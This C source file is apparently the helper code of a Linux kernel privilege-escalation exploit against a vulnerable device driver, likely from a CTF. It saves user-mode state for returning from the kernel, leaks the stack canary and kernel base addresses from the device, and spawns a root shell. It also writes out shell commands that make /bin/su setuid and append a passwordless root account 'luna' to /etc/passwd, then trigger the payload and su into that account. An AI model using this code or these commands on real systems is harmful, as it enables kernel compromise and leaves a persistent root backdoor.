#define _GNU_SOURCE
#include "struct.h"
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <poll.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdbool.h>
#include <stdint.h>
#include <string.h>
#include <signal.h>
#include <errno.h>
#include <stddef.h>
#include <pthread.h>
#include <sys/prctl.h>

#define MAX_LINE_LEN                256
#define COLOR_RED                   "\033[0;31m"
#define COLOR_GREEN                 "\033[0;32m"
#define COLOR_YELLOW                "\033[0;33m"
#define COLOR_RESET                 "\033[0m"

#define tty_size                    0x2B8
#define ui8                         uint8_t
#define ui16                        uint16_t
#define ui32                        uint32_t
#define ui64                        uint64_t
#define i8                          int8_t
#define i16                         int16_t
#define i32                         int32_t
#define i64                         int64_t

#define RESTORE                     \
    ch = user_cs;                   \
    ch = user_rflags;               \
    ch = user_sp;                   \
    ch = user_ss;

uint64_t cookie;
uint64_t kbase;
uint8_t cookie_off;
int fd;

void
open_dev(char* dev) {
    fd = open(dev, O_RDWR);
    if (fd < 0) {
        printf("[!] Failed to open %s\n", dev);
        exit(-1);
    } else {
        printf("[+] Successfully opened %s\n", dev);
    }
}

void
test(void) {
    puts(COLOR_GREEN "[+] Run normally !" COLOR_RESET);
}

void
spawn_shell(void) {
    uid_t uid = getuid();
    if (uid == 0) {
        printf("[+] UID: %d, got root!\n", uid);
    } else {
        printf("[!] UID: %d, we root-less :(!\n", uid);
        exit(-1);
    }
    system("/bin/sh");
}

uint64_t user_cs, user_ss, user_rflags, user_sp;
uint64_t user_rip = (uint64_t)spawn_shell;

void
save_state(void) {
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    puts("[*] Saved state");
}

void
dump(unsigned long* leak, unsigned n) {
    for (uint8_t i = 0; i < n; i++) {
        if (i * sizeof(uint64_t) >= n) {
            break;
        }
        uint64_t current_leak = leak[i];
        char leak_str[99];
        sprintf(leak_str, "%#02lx", current_leak);
        printf("\t--> %d: buf + 0x%x\t: %s\n", i, (unsigned int)(sizeof(leak[0]) * i), leak_str);
    }
}

bool
is_cookie(const char* str) {
    uint8_t in_len = strlen(str);
    if (in_len < 18) {
        return false;
    }

    char prefix[7] = "0xffff\0";
    char suffix[3] = "00\0";
    return (
        (!strncmp(str, prefix, strlen(prefix) - 1) == 0) &&
        (strncmp(str + in_len - strlen(suffix), suffix, strlen(suffix) - 1) == 0)
    );
}

uint64_t*
leak_cookie(uint32_t fd, uint64_t size) {
    uint8_t sz = size / 8;
    uint64_t leak[sz];
    memset(leak, 0, sizeof(leak));
    printf("[*] Attempting to leak up to %zu bytes\n", sizeof(leak));
    ssize_t bytes_read = read(fd, leak, sizeof(leak));

    if (bytes_read <= 0) {
        perror("[!] Failed to read from device during leak attempt");
        exit(-1);
    }
    printf("[*] Read %zd bytes. Searching leak...\n", bytes_read);

    for (uint8_t i = 0; i < sz; i++) {
        if (i * sizeof(uint64_t) >= bytes_read) {
            break;
        }

        uint64_t current_leak = leak[i];
        char leak_str[99];
        sprintf(leak_str, "%#02lx", current_leak);
        printf("\t--> %d: leak + 0x%x\t: %s", i, (unsigned int)(sizeof(leak[0]) * i), leak_str);

        int printed_marker = 0;
        if (!cookie && is_cookie(leak_str) && i > 2) {
            printf("\t<== stack canary\n");
            cookie_off = i;
            cookie = current_leak;
            printed_marker = 1;
        }

        if (!printed_marker) {
            puts("");
        }
    }

    if (!cookie) {
        puts("[!] Failed to leak stack cookie!");
    } else {
        printf("[*] Found stack cookie: %#018lx at offset %d\n", cookie, cookie_off);
    }

    return leak;
}

void
fatal(char* info) {
    printf(COLOR_RED "%s" COLOR_RESET, info);
    exit(-1);
}

void
check_leak(uint64_t addr) {
    if (addr & 0x100000) {
        puts("[!] Failed to get kgaslr leak");
        exit(-1);
    }
}

void
set_root_probe(void) {
    system("echo -e \"#!/bin/sh\nchown root:root /bin/su\nchmod u+s /bin/su\necho 'luna::0:0:root:/:/bin/sh' >> /etc/passwd\n\" > /tmp/x");
    system("chmod +x /tmp/x");
}

void
get_root_probe(void) {
    system("echo -e '\xFF\xFF\xFF\xFF' > /tmp/pwn");
    system("chmod +x /tmp/pwn");
    system("/tmp/pwn");
    system("su luna; /bin/sh");
    exit(0);
}